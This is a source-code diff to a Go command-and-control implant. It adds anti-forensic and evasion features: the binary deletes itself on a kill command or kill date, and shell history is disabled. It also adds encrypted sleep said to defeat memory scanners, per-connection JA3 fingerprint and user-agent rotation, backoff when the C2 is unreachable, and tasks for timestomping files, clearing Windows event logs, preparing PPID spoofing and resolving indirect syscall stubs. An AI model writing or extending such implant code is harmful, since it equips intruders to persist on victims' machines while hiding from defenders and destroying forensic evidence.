@@ -23,6 +23,17 @@ type Implant struct {
 	results   []protocol.TaskResult
 }
 
+// selfCleanup performs cleanup on kill/kill-date to minimize forensic artifacts.
+func selfCleanup() {
+	// Try to remove the agent binary
+	exe, err := os.Executable()
+	if err == nil {
+		os.Remove(exe)
+	}
+	// Clear environment
+	os.Setenv("HISTSIZE", "0")
+}
+
 // Run is the main entry point for the implant.
 // It handles registration, check-in loop, and task execution.
 func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, killDate string) {
@@ -65,22 +76,34 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 		SleepWithJitter(imp.sleep, imp.jitter)
 	}
 
-	// Main check-in loop
+	// Main check-in loop with stealth features
+	failCount := 0
 	for {
 		if CheckKillDate(imp.killDate) {
+			// Kill date passed — self-destruct
+			selfCleanup()
 			return
 		}
 
-		SleepWithJitter(imp.sleep, imp.jitter)
+		// Sleep with memory encryption (defeats memory scanners)
+		SleepEncrypted(imp.sleep, imp.jitter, imp.transport.sessionKey)
+
+		// Rotate JA3 fingerprint on each connection
+		imp.transport.client = StealthHTTPClient()
+		imp.transport.userAgent = RandomUserAgent()
 
 		// Check in and get tasks
 		tasks, err := imp.transport.CheckIn(imp.results)
 		imp.results = nil // Clear sent results
 
 		if err != nil {
-			// Connection failed, keep trying
+			failCount++
+			// Exponential backoff on failures (avoid flooding dead C2)
+			backoff := ExponentialBackoff(failCount, imp.sleep)
+			SleepWithJitter(int(backoff.Seconds()), imp.jitter)
 			continue
 		}
+		failCount = 0 // Reset on success
 
 		// Execute tasks
 		for _, task := range tasks {
@@ -91,6 +114,7 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 
 			// Check for kill command
 			if task.Type == protocol.TaskKill {
+				selfCleanup()
 				return
 			}
 		}
@@ -217,8 +241,42 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 		}
 
 	case protocol.TaskEvasion:
-		results := InitEvasion()
-		output = []byte(strings.Join(results, "\n"))
+		if len(task.Args) > 0 {
+			switch task.Args[0] {
+			case "timestomp":
+				if len(task.Args) >= 3 {
+					err = Timestomp(task.Args[1], task.Args[2])
+					if err == nil {
+						output = []byte("[+] Timestomped: " + task.Args[1] + " → matches " + task.Args[2])
+					}
+				} else {
+					output = []byte("Usage: evasion timestomp <target-file> <reference-file>")
+				}
+			case "clearlogs":
+				logResults := ClearWindowsLogs()
+				output = []byte(strings.Join(logResults, "\n"))
+			case "ppidspoof":
+				parentPID, _ := FindProcessByName("explorer.exe")
+				if parentPID > 0 {
+					output = []byte(fmt.Sprintf("[+] Found explorer.exe PID: %d — ready for PPID spoofing", parentPID))
+				} else {
+					output = []byte("[-] Could not find explorer.exe for PPID spoofing")
+				}
+			case "syscalls":
+				stub, stubErr := GetSyscallStub("NtAllocateVirtualMemory")
+				if stubErr == nil {
+					output = []byte(fmt.Sprintf("[+] NtAllocateVirtualMemory SSN: 0x%04X — indirect syscalls available", stub.SSN))
+				} else {
+					output = []byte("[-] Indirect syscalls: " + stubErr.Error())
+				}
+			default:
+				results := InitEvasion()
+				output = []byte(strings.Join(results, "\n"))
+			}
+		} else {
+			results := InitEvasion()
+			output = []byte(strings.Join(results, "\n"))
+		}
 
 	case protocol.TaskPivot:
 		output, err = ExecutePivotCommand(task.Args)
